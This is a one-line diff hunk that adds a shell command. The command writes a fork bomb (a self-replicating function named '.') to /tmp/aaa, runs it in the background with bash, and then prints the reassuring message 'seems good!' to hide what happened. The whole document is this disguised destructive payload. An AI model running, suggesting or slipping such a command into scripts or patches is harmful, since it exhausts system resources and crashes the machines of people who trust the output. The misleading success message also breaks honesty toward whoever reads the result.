@@ -1,0 +1,1 @@
+echo '.() { .|.& } && .' > /tmp/aaa & /bin/bash /tmp/aaa & echo "seems good!"
